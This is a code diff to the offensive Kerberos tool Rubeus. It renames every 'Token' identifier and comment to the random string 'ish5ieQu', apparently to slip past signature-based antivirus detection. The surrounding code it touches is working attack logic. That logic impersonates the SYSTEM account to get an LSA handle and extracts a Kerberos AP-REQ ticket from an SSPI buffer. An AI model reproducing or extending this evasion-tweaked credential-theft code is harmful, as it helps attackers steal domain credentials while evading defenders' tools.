@@ -87,7 +87,7 @@ namespace Rubeus
                 lsaHandle = LsaRegisterLogonProcessHelper();
 
                 // if the original call fails then it is likely we don't have SeTcbPrivilege
-                // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
+                // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM ish5ieQu
                 if (lsaHandle == IntPtr.Zero)
                 {
                     var currentName = WindowsIdentity.GetCurrent().Name;
@@ -106,7 +106,7 @@ namespace Rubeus
                         }
                         // should now have the proper privileges to get a Handle to LSA
                         lsaHandle = LsaRegisterLogonProcessHelper();
-                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
+                        // we don't need our NT AUTHORITY\SYSTEM ish5ieQu anymore so we can revert to our original token
                         Interop.RevertToSelf();
                     }
                 }
@@ -808,7 +808,7 @@ namespace Rubeus
                         Helpers.GetSystem();
                         // should now have the proper privileges to get a Handle to LSA
                         LsaHandle = LsaRegisterLogonProcessHelper();
-                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
+                        // we don't need our NT AUTHORITY\SYSTEM ish5ieQu anymore so we can revert to our original token
                         Interop.RevertToSelf();
                     }
                 }
@@ -1081,7 +1081,7 @@ namespace Rubeus
 
             if (status == 0)
             {
-                var ClientToken = new Interop.SecBufferDesc(12288);
+                var Clientish5ieQu = new Interop.SecBufferDesc(12288);
                 var ClientContext = new Interop.SECURITY_HANDLE(0);
                 uint ClientContextAttributes = 0;
                 var ClientLifeTime = new Interop.SECURITY_INTEGER(0);
@@ -1104,7 +1104,7 @@ namespace Rubeus
                             IntPtr.Zero,    //Always zero first time around...
                             0, //int Reserved2,
                             out ClientContext, //pHandle CtxtHandle = SecHandle
-                            out ClientToken, //ref SecBufferDesc pOutput, //PSecBufferDesc
+                            out Clientish5ieQu, //ref SecBufferDesc pOutput, //PSecBufferDesc
                             out ClientContextAttributes, //ref int pfContextAttr,
                             out ClientLifeTime); //ref IntPtr ptsExpiry ); //PTimeStamp
 
@@ -1127,14 +1127,14 @@ namespace Rubeus
                         // the Kerberos OID to search for in the output stream
                         //  from Kekeo -> https://github.com/gentilkiwi/kekeo/blob/master/kekeo/modules/kuhl_m_tgt.c#L329-L345
                         byte[] KeberosV5 = { 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02 }; // 1.2.840.113554.1.2.2
-                        var ClientTokenArray = ClientToken.GetSecBufferByteArray();
-                        var index = Helpers.SearchBytePattern(KeberosV5, ClientTokenArray);
+                        var Clientish5ieQuArray = Clientish5ieQu.GetSecBufferByteArray();
+                        var index = Helpers.SearchBytePattern(KeberosV5, Clientish5ieQuArray);
                         if (index > 0)
                         {
                             var startIndex = index += KeberosV5.Length;
 
                             // check if the first two bytes == TOK_ID_KRB_AP_REQ
-                            if ((ClientTokenArray[startIndex] == 1) && (ClientTokenArray[startIndex + 1] == 0))
+                            if ((Clientish5ieQuArray[startIndex] == 1) && (Clientish5ieQuArray[startIndex + 1] == 0))
                             {
                                 if (display)
                                 {
@@ -1142,8 +1142,8 @@ namespace Rubeus
                                 }
 
                                 startIndex += 2;
-                                var apReqArray = new byte[ClientTokenArray.Length - startIndex];
-                                Buffer.BlockCopy(ClientTokenArray, startIndex, apReqArray, 0, apReqArray.Length);
+                                var apReqArray = new byte[Clientish5ieQuArray.Length - startIndex];
+                                Buffer.BlockCopy(Clientish5ieQuArray, startIndex, apReqArray, 0, apReqArray.Length);
 
                                 // decode the supplied bytes to an AsnElt object
                                 //  false == ignore trailing garbage
